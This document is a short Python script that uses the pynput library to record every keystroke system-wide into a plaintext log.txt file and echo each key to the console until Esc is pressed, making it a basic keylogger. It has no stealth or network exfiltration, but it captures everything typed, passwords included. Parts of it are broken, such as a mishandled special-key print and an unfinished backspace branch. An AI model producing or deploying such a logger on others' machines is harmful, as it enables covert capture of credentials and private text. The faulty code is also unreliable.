import pynput
from pynput.keyboard import Key, Listener

# List to store pressed keys
keys = []

# Function to handle key press events
def on_press(key):
    # Append the pressed key to the list
    keys.append(key)
    # Write the keys to the log file
    write_file(keys)

    try:
        # Print the key that was pressed
        print('{} pressed'.format(key))
    except AttributeError:
        # Handle special keys (e.g., Shift, Ctrl)
        print('{} special key'.format(Key))

# Function to write the keys to a file
def write_file(keys):
    filename = 'log.txt'
    # Open the log file in write mode
    with open(filename, 'w') as f:
        for key in keys:
            # Convert the key to a string and remove single quotes
            k = str(key).replace("'", "")
            if key == Key.space:
                f.write(" ")
                continue
            if key == Key.enter:
                f.write("\n")
                continue

            #Todo implement backspace functionality
            if key == Key.backspace:
                with open(filename, 'r') as file:
                    contents = file.read()
                    print(contents)
            # Write the key to the file followed by a space
            f.write(k)
            #f.write('')

# Function to handle key release events
def on_release(key):
    # Print the key that was released
    print("{} released".format(key))
    # Stop the listener if the Escape key is released
    if key == Key.esc:
        return False

# Set up the listener for key press and release events
with Listener(on_press=on_press, on_release=on_release) as listener:
    # Start the listener
    listener.join()